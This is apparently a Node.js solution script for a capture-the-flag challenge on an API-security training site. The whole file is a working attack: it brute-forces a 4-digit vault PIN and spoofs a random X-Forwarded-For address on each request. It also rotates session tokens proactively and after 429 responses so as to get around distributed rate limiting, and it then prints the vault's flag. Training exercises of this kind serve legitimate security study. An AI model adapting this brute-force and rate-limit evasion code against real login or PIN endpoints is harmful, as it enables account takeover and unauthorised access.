/*
CHALLENGE DESCRIPTION

Welcome to the cutting edge of security! Our vault now employs quantum-inspired distributed rate limiting.

This challenge presents a password vault protected by a 4-digit PIN with a sophisticated multi-node rate limiting system and JWT-based authentication.

Your mission: Analyze the quantum token system, discover its vulnerabilities, and exploit them to bypass the distributed rate limiting and access the vault to retrieve the flag.
*/

const BASE_API_URL = 'https://rate-quantum.ac25.apisecuniversity.com';
const SESSION_API_ENDPOINT = '/api/quantum-session';
const VERIFY_PIN_API_ENDPOINT = '/api/quantum-verify';
const ROTATE_TOKEN_API_ENDPOINT = '/api/rotate-token';
const INSPECT_TOKEN_API_ENDPOINT = '/api/inspect-token';
const VAULT_API_ENDPOINT = '/api/quantum-vault';

const MIN_PIN = 0;
const MAX_PIN = 9999;

const REQUEST_TIMEOUT_MS = 5000;
const BASE_REQUEST_DELAY_MS = 50;
const ERROR_RETRY_DELAY_MS = 1500;
const TOKEN_MGMT_RETRY_DELAY_MS = 4000;
const TOKEN_ROTATION_ATTEMPTS = 3;

const MAX_SESSION_INIT_ATTEMPTS = 9;
const SESSION_INIT_RETRY_DELAY_MS = 60000;
const PROACTIVE_PIN_ROTATION = 2;

const BASE_HEADERS = {
  'Sec-Ch-Ua-Platform': '"Linux"',
  'Accept-Language': 'en-GB,en;q=0.9',
  'Sec-Ch-Ua': '"Chromium";v="135", "Not-A.Brand";v="8"',
  'Sec-Ch-Ua-Mobile': '?0',
  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
  'Accept': '*/*',
  'Origin': BASE_API_URL,
  'Sec-Fetch-Site': 'same-origin',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Dest': 'empty',
  'Referer': `${BASE_API_URL}/`,
};

const delay = ms => new Promise(res => setTimeout(res, ms));

const generateIpAddress = () => {
  const thirdOctet = Math.floor(Math.random() * 255);
  const fourthOctet = Math.floor(Math.random() * 253) + 1;
  return `192.168.${thirdOctet}.${fourthOctet}`;
};

const makeHttpRequest = async (url, method, headers = {}, body = null, timeoutMs = REQUEST_TIMEOUT_MS) => {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

  const fetchOptions = {
    method: method,
    headers: { ...headers },
    signal: controller.signal,
  };

  if (body) {
    if (fetchOptions.headers['Content-Type'] === 'application/json' && typeof body !== 'string') {
      try {
        fetchOptions.body = JSON.stringify(body);
      } catch (e) {
        clearTimeout(timeoutId);
        return {
          success: false,
          status: null,
          data: null,
          rawText: '',
          headers: {},
          error: `JSON stringify error: ${e.message}`,
        };
      }
    } else {
      fetchOptions.body = body;
    }
    if (typeof fetchOptions.body === 'string' && !fetchOptions.headers['Content-Length']) {
      fetchOptions.headers['Content-Length'] = Buffer.byteLength(fetchOptions.body).toString();
    }
  }

  try {
    const response = await fetch(url, fetchOptions);
    clearTimeout(timeoutId);

    const responseHeaders = {};
    response.headers.forEach((value, key) => {
      responseHeaders[key] = value;
    });
    const rawText = await response.text();
    let responseData = null;

    if (responseHeaders['content-type']?.includes('application/json')) {
      try {
        responseData = JSON.parse(rawText);
      } catch (e) {
        return {
          success: false,
          status: response.status,
          data: null,
          rawText: rawText,
          headers: responseHeaders,
          error: `Failed to parse JSON: ${e.message}. HTTP Status ${response.status}`,
        };
      }
    }

    const httpSuccess = response.status >= 200 && response.status < 300;
    return {
      success: httpSuccess,
      status: response.status,
      data: responseData,
      rawText: rawText,
      headers: responseHeaders,
      error: httpSuccess ? null : `HTTP error ${response.status} (${response.statusText || 'Unknown Status'})`,
    };
  } catch (error) {
    clearTimeout(timeoutId);
    const errorMessage =
      error.name === 'AbortError' ? `Request timed out after ${timeoutMs / 1000}s for ${url}` : `Network error for ${url}: ${error.message}`;
    return { success: false, status: null, data: null, rawText: '', headers: {}, error: errorMessage };
  }
};

const initializeQuantumSession = async () => {
  const url = BASE_API_URL + SESSION_API_ENDPOINT;
  let attempts = 0;

  while (attempts < MAX_SESSION_INIT_ATTEMPTS) {
    attempts++;
    process.stdout.write('\n');
    console.log(`Initializing quantum session (attempt ${attempts}/${MAX_SESSION_INIT_ATTEMPTS})...`);
    const response = await makeHttpRequest(url, 'POST', BASE_HEADERS);

    if (response.success && response.data?.success && response.data?.token) {
      console.log(
        `Session OK. Token: ${response.data.token.substring(0, 10)}... (Tokens remaining: ${response.data.tokensRemaining}, Expires: ${
          response.data.expires
        })`
      );
      return response.data.token;
    }

    if (response.status === 429) {
      console.error(`Session initialization failed (attempt ${attempts}/${MAX_SESSION_INIT_ATTEMPTS}). Status: 429 (Too Many Requests).`);
      if (attempts < MAX_SESSION_INIT_ATTEMPTS) {
        console.log(`Waiting ${SESSION_INIT_RETRY_DELAY_MS / 1000}s before retrying...`);
        await delay(SESSION_INIT_RETRY_DELAY_MS);
      } else {
        console.error('Max retries reached for session initialization due to 429 error.');
      }
    } else {
      console.error(
        `Session initialization failed (attempt ${attempts}/${MAX_SESSION_INIT_ATTEMPTS}). Status: ${response.status}. Error: ${
          response.error || JSON.stringify(response.data || response.rawText)
        }`
      );
      return null;
    }
  }
  return null;
};

const rotateAuthToken = async currentAuthToken => {
  const url = BASE_API_URL + ROTATE_TOKEN_API_ENDPOINT;
  const headers = { ...BASE_HEADERS, 'X-Quantum-Token': currentAuthToken };
  console.log(`Rotating auth token (input: ${currentAuthToken.substring(0, 10)}...).`);
  const response = await makeHttpRequest(url, 'POST', headers);

  if (response.success && response.data?.success && response.data?.token) {
    console.log(`Token rotation OK. New token: ${response.data.token.substring(0, 10)}...`);
    return response.data.token;
  }
  console.error(
    `Token rotation API call failed. Status: ${response.status}. Error: ${response.error || JSON.stringify(response.data || response.rawText)}`
  );
  return null;
};

const inspectAuthToken = async tokenToInspect => {
  const url = BASE_API_URL + INSPECT_TOKEN_API_ENDPOINT;
  const headers = { ...BASE_HEADERS, 'X-Quantum-Token': tokenToInspect };
  const response = await makeHttpRequest(url, 'POST', headers);

  if (response.success && response.data?.success && response.data?.tokenInfo) {
    const { expires, attempts } = response.data.tokenInfo;
    const expiresDate = new Date(expires);
    const currentDate = new Date();
    const isExpired = expiresDate <= currentDate;

    if (attempts === 0 && !isExpired) {
      return { isValid: true, tokenInfo: response.data.tokenInfo, error: null };
    }
    let errorMessages = [];
    if (attempts !== 0) errorMessages.push(`attempts is ${attempts} (expected 0)`);
    if (isExpired) errorMessages.push(`token is expired (expires ${expires})`);
    return { isValid: false, tokenInfo: response.data.tokenInfo, error: errorMessages.join(' & ') };
  }
  const errorDetail = response.error || JSON.stringify(response.data || response.rawText);
  console.log(`Inspect token info: Call failed or token invalid. Status: ${response.status}. Detail: ${errorDetail}`);
  return { isValid: false, tokenInfo: null, error: `Inspection API call failed: ${errorDetail}` };
};

const makeQuantumPinApiCall = async (apiEndpointPath, authToken, pinCode, ipAddress, beforeRequestLog = null) => {
  const url = BASE_API_URL + apiEndpointPath;
  const headers = {
    ...BASE_HEADERS,
    'X-Quantum-Token': authToken,
    'X-Forwarded-For': ipAddress,
    'Content-Type': 'application/json',
  };
  const payload = { pin: pinCode };

  if (beforeRequestLog) {
    console.log(beforeRequestLog);
  }

  return await makeHttpRequest(url, 'POST', headers, payload);
};

const getUsableToken = async initialToken => {
  let currentAttemptToken = initialToken;
  for (let attempt = 1; attempt <= TOKEN_ROTATION_ATTEMPTS; attempt++) {
    process.stdout.write('\n');
    console.log(`Processing token for usability (attempt ${attempt}/${TOKEN_ROTATION_ATTEMPTS}, input: ${currentAttemptToken.substring(0, 10)}...).`);
    const rotatedToken = await rotateAuthToken(currentAttemptToken);

    if (rotatedToken) {
      const inspectionResult = await inspectAuthToken(rotatedToken);
      if (inspectionResult.isValid) {
        console.log('Token is valid and usable after rotation and inspection.');
        return rotatedToken;
      }
      console.warn(`Rotated token failed inspection: ${inspectionResult.error || 'Unknown reason'}.`);
      currentAttemptToken = rotatedToken;
      if (attempt < TOKEN_ROTATION_ATTEMPTS) await delay(TOKEN_MGMT_RETRY_DELAY_MS);
    } else {
      console.warn(
        `Token rotation API call itself failed for token starting ${currentAttemptToken.substring(
          0,
          10
        )} (attempt ${attempt}/${TOKEN_ROTATION_ATTEMPTS}).`
      );
      if (attempt < TOKEN_ROTATION_ATTEMPTS) await delay(TOKEN_MGMT_RETRY_DELAY_MS);
      else {
        console.error('All attempts to get a usable token via rotation failed.');
        return null;
      }
    }
  }
  console.error('Exhausted attempts in getUsableToken without returning a valid token.');
  return null;
};

const main = async () => {
  const initialSessionToken = await initializeQuantumSession();
  if (!initialSessionToken) {
    console.error('Failed to get initial session token after all retries. Exiting.');
    process.exit(1);
  }

  let currentAuthToken = await getUsableToken(initialSessionToken);
  if (!currentAuthToken) {
    console.error('Failed to obtain a usable token after initial processing. Exiting.');
    process.exit(1);
  }
  let pinAttemptsWithCurrentToken = 0;

  let transientErrorLastAttempt = false;
  let currentPin = MIN_PIN;

  while (currentPin <= MAX_PIN) {
    const pinToTry = currentPin.toString().padStart(4, '0');
    const ipAddress = generateIpAddress();

    const progressMessage = transientErrorLastAttempt
      ? `Retrying PIN ${pinToTry} (IP: ${ipAddress}, Token: ${currentAuthToken.substring(0, 6)}...)...\r`
      : `Trying PIN ${pinToTry} (IP: ${ipAddress}, Token: ${currentAuthToken.substring(0, 6)}, Attempt ${pinAttemptsWithCurrentToken + 1})...\r`;
    process.stdout.write(progressMessage);
    transientErrorLastAttempt = false;

    const verificationResponse = await makeQuantumPinApiCall(VERIFY_PIN_API_ENDPOINT, currentAuthToken, pinToTry, ipAddress);

    if (verificationResponse.status === null || verificationResponse.status === 503) {
      process.stdout.write('\n');
      const errorType = verificationResponse.status === 503 ? '503 Service Unavailable' : 'Request Failed/Timeout';
      const errorDetail = verificationResponse.status === 503 ? '' : `: ${verificationResponse.error}`;
      console.warn(`PIN ${pinToTry}: ${errorType}${errorDetail}.`);
      console.log(`Retrying PIN ${pinToTry} in ${ERROR_RETRY_DELAY_MS / 1000}s.`);
      await delay(ERROR_RETRY_DELAY_MS);
      transientErrorLastAttempt = true;
      continue;
    }

    pinAttemptsWithCurrentToken++;

    if (verificationResponse.success && verificationResponse.data?.success === true) {
      process.stdout.write('\n');
      console.log(`PIN ${pinToTry} verified successfully against ${VERIFY_PIN_API_ENDPOINT}!`);
      console.log(`Verification response: ${JSON.stringify(verificationResponse.data)}`);
      console.log(`Inspecting token ${currentAuthToken.substring(0, 10)}... before vault access.`);
      const inspectionBeforeVault = await inspectAuthToken(currentAuthToken);
      let tokenForVault = currentAuthToken;

      if (!inspectionBeforeVault.isValid) {
        process.stdout.write('\n');
        console.warn(`Token became invalid after PIN verify, before vault access: ${inspectionBeforeVault.error}. Attempting to refresh.`);
        const refreshedToken = await getUsableToken(currentAuthToken);
        if (refreshedToken) {
          tokenForVault = refreshedToken;
          currentAuthToken = refreshedToken;
          pinAttemptsWithCurrentToken = 0;
          console.log(`Token refreshed successfully before vault access. New token: ${tokenForVault.substring(0, 10)}.`);
        } else {
          console.error(
            `Critical: Failed to refresh token for PIN ${pinToTry} before vault access. Skipping vault attempt for this PIN, will proceed to next PIN logic.`
          );
          currentPin++;
          await delay(BASE_REQUEST_DELAY_MS);
          continue;
        }
      }

      const vaultLogMessage = `Attempting to access quantum vault with PIN: ${pinToTry}, Token: ${tokenForVault.substring(
        0,
        10
      )}..., IP: ${ipAddress}`;
      const vaultResponse = await makeQuantumPinApiCall(VAULT_API_ENDPOINT, tokenForVault, pinToTry, ipAddress, vaultLogMessage);

      if (vaultResponse.success && vaultResponse.data?.success === true) {
        console.log(`Quantum Vault accessed successfully with PIN ${pinToTry}!`);
        console.log('Vault Data (contains the flag!):');
        console.log(JSON.stringify(vaultResponse.data, null, 2));
        process.exit(0);
      } else {
        process.stdout.write('\n');
        console.error(`Failed to access Quantum Vault with PIN ${pinToTry} using token ${tokenForVault.substring(0, 10)}...`);
        console.error(
          `Vault access status: ${vaultResponse.status}, Error: ${vaultResponse.error || JSON.stringify(vaultResponse.data || vaultResponse.rawText)}`
        );
      }
    } else {
      process.stdout.write('\n');
      console.log(
        `PIN ${pinToTry} verification failed. Response: ${JSON.stringify(verificationResponse.data || verificationResponse.rawText)} (Status: ${
          verificationResponse.status
        })`
      );
    }

    let needsRotation = false;
    const verifyResponseMessage = verificationResponse.data?.message?.toLowerCase() || verificationResponse.data?.error?.toLowerCase() || '';

    if (verificationResponse.status === 429 || verifyResponseMessage.includes('rate limit') || verifyResponseMessage.includes('blocked')) {
      console.log('Rate limit / Blocked detected (on PIN verify). Rotating token.');
      needsRotation = true;
    } else if (
      verifyResponseMessage.includes('token') &&
      (verifyResponseMessage.includes('invalid') || verifyResponseMessage.includes('expired') || verifyResponseMessage.includes('not valid'))
    ) {
      console.log('Token explicitly invalid/expired (on PIN verify). Rotating token.');
      needsRotation = true;
    } else if (pinAttemptsWithCurrentToken >= PROACTIVE_PIN_ROTATION) {
      console.log(`Proactive token rotation triggered after ${pinAttemptsWithCurrentToken} attempts with this token.`);
      needsRotation = true;
    } else if (!verificationResponse.success && verificationResponse.status !== 400 && !(verificationResponse.data?.success === true)) {
      console.log(`Potentially compromised token or unhandled error on PIN verify (Status: ${verificationResponse.status}). Rotating token.`);
      needsRotation = true;
    }

    if (needsRotation) {
      console.log('Attempting main token rotation cycle...');
      const newAuthToken = await getUsableToken(currentAuthToken);
      if (newAuthToken) {
        currentAuthToken = newAuthToken;
        pinAttemptsWithCurrentToken = 0;
        console.log(`Token rotation successful. New token: ${currentAuthToken.substring(0, 10)}. Retrying PIN ${pinToTry}.`);
        transientErrorLastAttempt = true;
      } else {
        console.error('Failed to get a usable token after rotation attempts. Exiting.');
        process.exit(1);
      }
    } else if (!(verificationResponse.success && verificationResponse.data?.success === true)) {
      currentPin++;
    } else if (verificationResponse.success && verificationResponse.data?.success === true) {
      if (!transientErrorLastAttempt) {
        currentPin++;
      }
    }

    await delay(BASE_REQUEST_DELAY_MS);
  }

  process.stdout.write('\n');
  if (currentPin > MAX_PIN) {
    console.log(
      `All PINs from ${MIN_PIN.toString().padStart(4, '0')} to ${MAX_PIN.toString().padStart(
        4,
        '0'
      )} attempted. PIN not found or vault access failed.`
    );
  }
  process.exit(1);
};

main().catch(error => {
  process.stdout.write('\n');
  console.error(`Unhandled application error: ${error.message || error}`);
  console.error(error.stack);
  process.exit(1);
});
